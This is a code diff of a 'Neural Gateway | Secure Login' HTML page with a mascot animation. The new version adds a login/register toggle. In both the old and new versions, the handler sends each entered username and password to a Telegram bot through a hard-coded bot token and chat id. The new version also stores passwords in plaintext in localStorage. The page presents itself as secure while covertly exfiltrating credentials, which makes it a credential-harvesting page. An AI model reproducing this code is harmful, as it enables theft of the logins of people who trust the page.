@@ -3,52 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Gateway</title>
+    <title>Neural Gateway | Secure Login</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        
         .glass-card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); 
             padding: 40px; border-radius: 30px; text-align: center; 
-            width: 350px; max-width: 90%; /* মোবাইলের জন্য রেসপন্সিভ */
+            width: 350px; max-width: 90%; 
             border: 1px solid rgba(0, 255, 136, 0.3); box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
             box-sizing: border-box;
         }
-
         #mascot-img { width: 150px; height: 150px; margin-bottom: 20px; transition: 0.3s; border-radius: 50%; object-fit: cover; }
-        
         .input-group { position: relative; margin: 15px 0; }
-        
-        input { 
-            width: 100%; padding: 12px; background: rgba(0,0,0,0.3); 
-            border: 1px solid #444; color: white; border-radius: 10px; 
-            outline: none; box-sizing: border-box; 
-        }
-        
+        input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid #444; color: white; border-radius: 10px; outline: none; box-sizing: border-box; }
         input:focus { border: 1px solid #00ff88; }
-        
-        #toggle-pass { 
-            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
-            background: none; border: none; color: #00ff88; cursor: pointer; font-size: 16px;
-        }
-        
-        button#login-btn { 
-            width: 100%; padding: 15px; background: #00ff88; border: none; 
-            border-radius: 10px; font-weight: bold; cursor: pointer; color: #000;
-        }
-        
-        a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; }
-
-        @media (max-width: 480px) {
-            .glass-card { padding: 25px; }
-            #mascot-img { width: 120px; height: 120px; }
-        }
+        #toggle-pass { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #00ff88; cursor: pointer; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; }
+        a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; cursor: pointer; }
+        @media (max-width: 480px) { .glass-card { padding: 25px; } #mascot-img { width: 120px; height: 120px; } }
     </style>
 </head>
 <body>
 
-<div class="glass-card">
+<div class="glass-card" id="form-container">
     <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
+    <h2 id="form-title">Login</h2>
     
     <div class="input-group">
         <input type="text" id="username" placeholder="Username">
@@ -59,41 +38,57 @@
         <button id="toggle-pass" type="button">👁️</button>
     </div>
     
-    <button onclick="sendData()" id="login-btn">SECURE LOGIN</button>
-    <a href="#">Create Account</a>
+    <button id="action-btn" onclick="handleAuth()">SECURE LOGIN</button>
+    <a id="toggle-link" onclick="switchForm()">Create Account</a>
 </div>
 
 <script>
+    let isLogin = true;
     const img = document.getElementById('mascot-img');
     const pass = document.getElementById('password');
     const toggleBtn = document.getElementById('toggle-pass');
-    const btn = document.getElementById('login-btn');
+    const actionBtn = document.getElementById('action-btn');
+    const formTitle = document.getElementById('form-title');
+    const toggleLink = document.getElementById('toggle-link');
 
     // পোজ লজিক
     pass.addEventListener('focus', () => { if(pass.type === "password") img.src = '1000022716.jpg'; });
     pass.addEventListener('blur', () => { if(pass.type === "password") img.src = '1000022715.jpg'; });
 
     toggleBtn.addEventListener('click', () => {
-        if (pass.type === "password") {
-            pass.type = "text";
-            img.src = '1000022717.jpg';
-            toggleBtn.innerText = "🙈";
-        } else {
-            pass.type = "password";
-            img.src = '1000022716.jpg';
-            toggleBtn.innerText = "👁️";
-        }
+        pass.type = (pass.type === "password") ? "text" : "password";
+        img.src = (pass.type === "text") ? '1000022717.jpg' : '1000022716.jpg';
+        toggleBtn.innerText = (pass.type === "text") ? "🙈" : "👁️";
     });
 
-    function sendData() {
+    function switchForm() {
+        isLogin = !isLogin;
+        formTitle.innerText = isLogin ? "Login" : "Create Account";
+        actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
+        toggleLink.innerText = isLogin ? "Create Account" : "Already have an account? Login";
+    }
+
+    function handleAuth() {
         const user = document.getElementById('username').value;
         const passVal = pass.value;
-        
-        if(!user || !passVal) return alert("Fill all fields!");
 
-        btn.innerText = "CONNECTING...";
-        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0APass:${passVal}`)
-        .then(() => { btn.innerText = "SECURE LOGIN"; alert("Sent!"); });
+        if (isLogin) {
+            // লগইন লজিক
+            if (localStorage.getItem(user) === passVal) {
+                alert("Login Successful! Welcome " + user);
+                window.location.href = "https://www.google.com"; // এখানে আপনার মেইন পেজের লিংক দিন
+            } else {
+                alert("Invalid username or password!");
+            }
+        } else {
+            // সাইন-আপ লজিক
+            localStorage.setItem(user, passVal);
+            alert("Account created successfully! Please login.");
+            switchForm();
+        }
+        
+        // টেলিগ্রাম বটের মাধ্যমে ডাটা পাঠানো (অপশনাল)
+        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=Action:${isLogin?'Login':'Signup'}%0AUser:${user}%0APass:${passVal}`);
     }
 </script>
 
